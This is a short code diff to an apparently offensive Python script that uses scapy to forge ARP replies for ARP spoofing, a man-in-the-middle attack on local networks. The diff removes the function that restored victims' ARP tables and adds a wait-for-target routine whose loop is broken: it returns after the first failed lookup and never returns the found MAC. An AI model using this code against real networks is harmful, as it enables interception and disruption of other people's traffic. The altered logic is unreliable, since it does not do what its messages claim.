@@ -15,11 +15,13 @@ def spoof(target_ip, spoof_ip):
     arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     scapy.send(arp_response, verbose=False)
 
-def restore(target_ip, spoof_ip):
-    target_mac = get_mac(target_ip)
-    spoof_mac = get_mac(spoof_ip)
-    if target_mac is None or spoof_mac is None:
-        print(f"Cannot find mac for {target_ip} or {spoof_ip}")
-        return
-    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
-    scapy.send(arp_response, count=4, verbose=False)
+def wait_for_target(target_ip, spoof_ip):
+    print(f"Waiting for {target_ip} to be online...")
+    while True:
+        target_mac = get_mac(target_ip)
+        if target_mac:
+            print(f"Found {target_ip} with MAC {target_mac}. Starting ARP spoofing...")
+            break
+        else:
+            print(f"{target_ip} not found. Retrying...")
+            return target_mac
